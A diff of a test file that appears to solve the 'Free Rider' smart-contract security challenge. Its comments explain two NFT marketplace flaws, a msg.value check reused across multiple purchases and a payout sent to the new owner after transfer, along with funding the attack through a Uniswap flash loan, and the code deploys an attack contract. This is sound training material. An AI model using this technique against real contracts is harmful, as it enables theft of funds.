@@ -104,7 +104,20 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // marketplace contains two errors:
+        // 1. it uses "msg.value" to check for payment without subtracting the amount for many buys, meaning
+        //    we can buy all the nfts for the price of a single
+        // 2. it pays the owner of the nft after transferring the nft, meaning it pays back to the buyer
+        // to get the 15ETH, take a loan from the uniswap pool
+        const hack = await (await ethers.getContractFactory('HackFreeRider', attacker)).deploy(
+            this.uniswapPair.address,
+            this.weth.address,
+            this.marketplace.address,
+            this.nft.address,
+            this.buyerContract.address
+        );
+
+        await hack.hack(NFT_PRICE);
     });
 
     after(async function () {
